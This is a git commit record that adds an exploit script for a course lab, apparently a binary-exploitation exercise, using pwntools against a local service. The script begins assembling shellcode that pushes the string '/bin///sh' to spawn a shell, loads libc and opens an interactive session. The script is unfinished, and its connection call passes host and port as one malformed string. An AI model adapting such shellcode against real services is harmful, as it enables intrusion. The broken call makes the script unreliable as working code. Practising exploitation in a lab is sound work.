77f979d4164312c0ae5bf18a85ae2920c431928b
Yasheed1995 <qwerty8608301@gmail.com>
2018-09-29 21:15:38 +0800

    modify lab1-1

---
+++ Lab_1/Lab1-1/exp.py
@@ -0,0 +1,17 @@
+from pwn import *
+from IPython import embed
+
+context.arch = 'amd64'
+
+r = remote('127.0.0.1, 7127')
+
+a = asm("""
+        push 0x68
+        mov rax, 0x732f2f2f6e69622f
+        push rax
+        """)
+
+e = ELF('/lib/x86-64-linux-gnu/libc.so.6')
+embed()
+
+r.interactive()
